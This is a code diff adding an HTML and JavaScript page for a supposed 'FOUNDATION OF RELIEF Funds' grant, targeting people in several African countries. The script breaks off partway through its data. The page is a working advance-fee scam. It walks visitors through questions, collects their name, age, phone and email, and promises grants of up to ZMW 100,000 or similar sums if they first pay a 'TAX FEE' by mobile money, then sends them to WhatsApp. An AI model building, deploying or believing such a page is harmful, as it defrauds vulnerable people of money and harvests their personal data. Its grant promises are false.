@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FOUNDATION OF RELIEF Funds</title>
+    <style>
+        :root {
+            --primary-color: #008751; /* Trustworthy Financial Green */
+            --secondary-color: #ffd700; /* Gold for wealth/vibrancy */
+            --dark-color: #1a252f;
+            --light-color: #ffffff;
+            --gradient: linear-gradient(135deg, #008751 0%, #004d2e 100%);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f4f7f6;
+            color: var(--dark-color);
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Moving Money Background Animations */
+        .money-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .money-item {
+            position: absolute;
+            font-size: 24px;
+            user-select: none;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-50px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(105vh) rotate(360deg);
+                opacity: 0.3;
+            }
+        }
+
+        /* Main Website Layout */
+        .header {
+            width: 100%;
+            max-width: 600px;
+            background: var(--gradient);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            border-radius: 15px 15px 0 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .header h1 {
+            font-size: 1.6rem;
+            margin-bottom: 5px;
+            color: var(--secondary-color);
+        }
+
+        .hero-img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-bottom: 5px solid var(--secondary-color);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: var(--light-color);
+            padding: 30px;
+            border-radius: 0 0 15px 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            margin-bottom: 30px;
+        }
+
+        /* Step/Question Setup */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .question-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--dark-color);
+            line-height: 1.5;
+        }
+
+        /* Form styling */
+        select, input[type="text"], input[type="number"], input[type="email"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        select:focus, input:focus {
+            border-color: var(--primary-color);
+        }
+
+        /* Radio Buttons Box style */
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .radio-label {
+            background: #f8faf9;
+            border: 2px solid #eef2f0;
+            padding: 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .radio-label:hover {
+            background: #edf7f3;
+            border-color: var(--primary-color);
+        }
+
+        .radio-label input[type="radio"] {
+            transform: scale(1.2);
+            accent-color: var(--primary-color);
+        }
+
+        /* Action Buttons */
+        .btn {
+            width: 100%;
+            background: var(--gradient);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 10px rgba(0, 135, 81, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 135, 81, 0.4);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Decorative Badge */
+        .badge {
+            display: inline-block;
+            background: #fff3cd;
+            color: #856404;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .congrats-card {
+            background: #e8f5e9;
+            border-left: 5px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Moving money background nodes -->
+    <div class="money-container" id="moneyContainer"></div>
+
+    <!-- Header Banner with happy corporate people imagery -->
+    <div class="header">
+        <h1> FOUNDATION OF RELIEF Funds</h1>
+        <p>Empowering Communities & Financial Security</p>
+    </div>
+    
+    <!-- Image showcasing financial growth & joyful success -->
+    <img src="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?auto=format&fit=crop&w=600&q=80" alt="Happy People Success" class="hero-img">
+
+    <div class="container">
+        <form id="grantForm" onsubmit="event.preventDefault();">
+
+            <!-- QUESTION 1: Country Picker -->
+            <div class="step active" id="step1">
+                <p class="question-title">✔️ Which country are you coming from? / Unatokea nchi gani?</p>
+                <select id="country" onchange="handleCountryChange()" required>
+                    <option value="" disabled selected>-- Select Country --</option>
+                    <option value="Zambia">Zambia 🇿🇲</option>
+                    <option value="Uganda">Uganda 🇺🇬</option>
+                    <option value="SouthSudan">South Sudan 🇸🇸</option>
+                    <option value="Cameroon">Cameroon 🇨🇲</option>
+                    <option value="Kenya">Kenya 🇰🇪</option>
+                    <option value="Tanzania">Tanzania 🇹🇿</option>
+                </select>
+                <button type="button" class="btn" onclick="nextStep(1)">Next / Endelea</button>
+            </div>
+
+            <!-- QUESTION 2: Greetings & Ready Check -->
+            <div class="step" id="step2">
+                <p class="question-title" id="q2-text">
+                    📌 Greetings. Thank you for contacting FOUNDATION OF RELIEF funds... Let me know if you are ready to answer a few questions before receiving our Funds?
+                </p>
+                <div class="radio-group" id="q2-options">
+                    <label class="radio-label"><input type="radio" name="ready" value="Yes" required> <span class="opt-yes">Yes</span></label>
+                    <label class="radio-label"><input type="radio" name="ready" value="No"> <span class="opt-no">No</span></label>
+                </div>
+                <button type="button" class="btn" onclick="nextStep(2)">Next</button>
+            </div>
+
+            <!-- QUESTION 3: Traffic Source -->
+            <div class="step" id="step3">
+                <p class="question-title" id="q3-text">📌 Where did you hear about the FOUNDATION OF RELIEF FUNDS?</p>
+                <div class="radio-group" id="q3-options">
+                    <label class="radio-label"><input type="radio" name="source" value="PERSONAL RECOMMENDATION" required> <span>1: PERSONAL RECOMMENDATION</span></label>
+                    <label class="radio-label"><input type="radio" name="source" value="SOCIAL NETWORK"> <span>2: SOCIAL NETWORK</span></label>
+                    <label class="radio-label"><input type="radio" name="source" value="BROADCASTING OF NEWS"> <span>3: BROADCASTING OF NEWS</span></label>
+                    <label class="radio-label"><input type="radio" name="source" value="OTHER"> <span>4: OTHER</span></label>
+                </div>
+                <button type="button" class="btn" onclick="nextStep(3)">Next</button>
+            </div>
+
+            <!-- QUESTION 4: First Time Participant -->
+            <div class="step" id="step4">
+                <p class="question-title" id="q4-text">📌 Is it your first time participating in FOUNDATION 0F RELIEF FUND PROGRAM?</p>
+                <div class="radio-group" id="q4-options">
+                    <label class="radio-label"><input type="radio" name="first_time" value="Yes" required> <span class="opt-yes">1. Yes</span></label>
+                    <label class="radio-label"><input type="radio" name="first_time" value="No"> <span class="opt-no">2. No</span></label>
+                </div>
+                <button type="button" class="btn" onclick="nextStep(4)">Next</button>
+            </div>
+
+            <!-- QUESTION 5: Intentions -->
+            <div class="step" id="step5">
+                <p class="question-title" id="q5-text">📌 Regarding our FOUNDATION OF RELIEF FUNDS, what do you intend to do with the funds?</p>
+                <div class="radio-group" id="q5-options">
+                    <label class="radio-label"><input type="radio" name="intent" value="INVESTMENT" required> <span class="opt-i1">1. INVESTMENT</span></label>
+                    <label class="radio-label"><input type="radio" name="intent" value="COVER EMERGENCY EXPENSES"> <span class="opt-i2">2. COVER EMERGENCY EXPENSES</span></label>
+                    <label class="radio-label"><input type="radio" name="intent" value="CONSOLIDATE DEBT"> <span class="opt-i3">3. CONSOLIDATE DEBT</span></label>
+                    <label class="radio-label"><input type="radio" name="intent" value="SCHOOL FEES"> <span class="opt-i4">4. SCHOOL FEES</span></label>
+                    <label class="radio-label"><input type="radio" name="intent" value="BUSINESS"> <span class="opt-i5">5. BUSINESS</span></label>
+                    <label class="radio-label"><input type="radio" name="intent" value="Other"> <span class="opt-i6">6. Other</span></label>
+                </div>
+                <button type="button" class="btn" onclick="nextStep(5)">Next</button>
+            </div>
+
+            <!-- QUESTION 6: Occupation Dropdown -->
+            <div class="step" id="step6">
+                <p class="question-title" id="q6-text">📌 What is your occupation?</p>
+                <select id="occupation" required>
+                    <option value="" disabled selected id="q6-select-prompt">-- Select Occupation --</option>
+                    <option value="Accountant">1. 🎯 Accountant</option>
+                    <option value="Businessperson/Salesperson">2. 🎯 Businessperson/Salesperson</option>
+                    <option value="Farmer">3. 🎯 Farmer</option>
+                    <option value="Student">4. 🎯 Student</option>
+                    <option value="Teacher">5. 🎯 Teacher</option>
+                    <option value="Doctor">6. 🎯 Doctor</option>
+                    <option value="Engineer">7. 🎯 Engineer</option>
+                    <option value="Lawyer">8. 🎯 Lawyer</option>
+                    <option value="Waiter">9. 🎯 Waiter</option>
+                    <option value="Homeworker">10. 🎯 Homeworker</option>
+                    <option value="Self employed">11. 🎯 Self employed</option>
+                    <option value="Retired">12. 🎯 Retired</option>
+                    <option value="Others">13. 🎯 Others</option>
+                </select>
+                <button type="button" class="btn" onclick="nextStep(6)">Next</button>
+            </div>
+
+            <!-- QUESTION 7: Details Verification -->
+            <div class="step" id="step7">
+                <p class="question-title" id="q7-text">📌 Thanks for your answers ✅ Please verify your details as follows:</p>
+                <input type="text" id="user_name" placeholder="Full Name / Jina Kamili" required>
+                <input type="number" id="user_age" placeholder="Age / Umri" required>
+                <input type="text" id="user_phone" placeholder="Phone Number / Nambari ya Simu" required>
+                <input type="email" id="user_email" placeholder="Email Address / Barua Pepe" required>
+                
+                <p style="margin-top:10px; font-weight:bold;" id="lbl-referred">Who referred you? (Optional)</p>
+                <select id="referrer">
+                    <option value="None" selected>None</option>
+                    <option value="Friend">Friend</option>
+                    <option value="Social Media Ad">Social Media Ad</option>
+                    <option value="Officer">Foundation Representative</option>
+                </select>
+                <button type="button" class="btn" onclick="setupCountryPackageStep()">Next</button>
+            </div>
+
+            <!-- QUESTION 8: Dynamic Package Select (Based on Country Selection) -->
+            <div class="step" id="step8">
+                <p class="question-title" id="package-title">Select Your Package</p>
+                <select id="package-dropdown" required></select>
+                <div class="badge" id="package-note"></div>
+                <button type="button" class="btn" onclick="nextStep(8)">Next</button>
+            </div>
+
+            <!-- QUESTION 9: Eligibility Statement Confirmation (Ready / Not Ready) -->
+            <div class="step" id="step9">
+                <div class="congrats-card" id="congrats-text"></div>
+                <div class="radio-group">
+                    <label class="radio-label"><input type="radio" name="status_ready" value="READY" required> <span id="lbl-ready">READY</span></label>
+                    <label class="radio-label"><input type="radio" name="status_ready" value="NOT READY"> <span id="lbl-notready">NOT READY</span></label>
+                </div>
+                <button type="button" class="btn" onclick="nextStep(9)">Next</button>
+            </div>
+
+            <!-- QUESTION 10: Payment Network Line Setup -->
+            <div class="step" id="step10">
+                <p class="question-title" id="q10-title">Which line are you using to pay your TAX FEE?</p>
+                <p style="font-size:0.9rem; color:#666; margin-bottom:10px;" id="q10-subtitle"></p>
+                <div class="radio-group" id="payment-lines">
+                    <!-- Loaded dynamically via JavaScript logic -->
+                </div>
+                <button type="button" class="btn" onclick="finalizeAndSubmit()">Submit & Continue to WhatsApp</button>
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        // Data configurations for Packages across countries
+        const packages = {
+            Zambia: {
+                currency: "ZMW",
+                note: "NB: 9, 10, 11 and 12 is credited to your BANK ACCOUNT.",
+                options: [
+                    {val: "15000_399", text: "To get ZMW 15,000 - fee is ZMW 399", grant: "15,000", fee: "399"},
+                    {val: "18000_599", text: "To get ZMW 18,000 - fee is ZMW 599", grant: "18,000", fee: "599"},
+                    {val: "23000_999", text: "To get ZMW 23,000 - fee is ZMW 999", grant: "23,000", fee: "999"},
+                    {val: "35000_1999", text: "To get ZMW 35,000 - fee is ZMW 1,999", grant: "35,000", fee: "1,999"},
+                    {val: "42000_2299", text: "To get ZMW 42,000 - fee is ZMW 2,299", grant: "42,000", fee: "2,299"},
+                    {val: "50000_2699", text: "To get ZMW 50,000 - fee is ZMW 2,699", grant: "50,000", fee: "2,699"},
+                    {val: "58000_3299", text: "To get ZMW 58,000 - fee is ZMW 3,299", grant: "58,000", fee: "3,299"},
+                    {val: "68000_3999", text: "To get ZMW 68,000 - fee is ZMW 3,999", grant: "68,000", fee: "3,999"},
+                    {val: "74000_4499", text: "To get ZMW 74,000 - fee is ZMW 4,499", grant: "74,000", fee: "4,499"},
+                    {val: "82000_5299", text: "To get ZMW 82,000 - fee is ZMW 5,299", grant: "82,000", fee: "5,299"},
+                    {val: "92000_5999", text: "To get ZMW 92,000 - fee is ZMW 5,999", grant: "92,000", fee: "5,999"},
+                    {val: "100000_6499", text: "To get ZMW 100,000 - fee is ZMW 6,499", grant: "100,000", fee: "6,499"}
+                ],
+                lines: ["MTN", "AIRTEL", "Other"]
+            },
+            Uganda: {
+                currency: "Ugx",
+                note: "Which grants are you capable of paying its tax fee?",
+                options: [
+                    {val: "3599000_100950", text: "1. Ugx.3,599,000 .fee. Ugx.100,950", grant: "3,599,000", fee: "100,950"},
+                    {val: "4100000_205999", text: "2. Ugx.4,100,000 .fee. Ugx.205,999", grant: "4,100,000", fee: "205,999"},
+                    {val: "6000000_310999", text: "3. Ugx.6,000,000 .fee. Ugx.310,999", grant: "6,000,000", fee: "310,999"},
+                    {val: "8237000_410999", text: "4. Ugx.8,237,000 .fee. Ugx.410,999", grant: "8,237,000", fee: "410,999"},
+                    {val: "10237000_500999", text: "5. Ugx.10,237,000 .fee. Ugx.500,999", grant: "10,237,000", fee: "500,999"},
+                    {val: "12237000_810000", text: "6. Ugx.12,237,000 .fee. Ugx.810,000", grant: "12,237,000", fee: "810,000"},
+                    {val: "14700000_999000", text: "7. Ugx.14,700,000 .fee. Ugx.999,000", grant: "14,700,000", fee: "999,000"},
+                    {val: "16800000_1500099", text: "8. Ugx.16,800,000 .fee. Ugx.1,500,999", grant: "16,800,000", fee: "1,500,999"}
+                ],
+                lines: ["MTN", "AIRTEL", "Other"]
+            },
+            SouthSudan: {
+                currency: "SSP",
+                note: "Which of the awards below are you capable of paying its tax fee?",
+                options: [
+                    {val: "1690000_300000", text: "1. Fee SSP 300,000 to get SSP 1,690,000", grant: "1,690,000", fee: "300,000"},
+                    {val: "2100000_400000", text: "2. Fee SSP 400,000 to get SSP 2,100,000", grant: "2,100,000", fee: "400,000"},
+                    {val: "4273030_500000", text: "3. Fee SSP 500,000 to get SSP 4,273,030", grant: "4,273,030", fee: "500,000"},
+                    {val: "5524220_600000", text: "4. Fee SSP 600,000 to get SSP 5,524,220", grant: "5,524,220", fee: "600,000"},
+                    {val: "8654400_700000", text: "5. Fee SSP 700,000 to get SSP 8,654,400", grant: "8,654,400", fee: "700,000"},
+                    {val: "10000000_800000", text: "6. Fee SSP 800,000 to get SSP 10,000,000", grant: "10,000,000", fee: "800,000"}
+                ],
+                lines: ["M-pesa shop", "Dahabshil", "Mobile money transfer", "M📱Gurush", "Other"],
+                subtext: "Is there any of these nearby you..."
+            },
+            Cameroon: {
+                currency: "XAF",
+                note: "International Foundation of Relief Fund: Grant Categories and revenue Fees",
+                options: [
+                    {val: "550000_1500
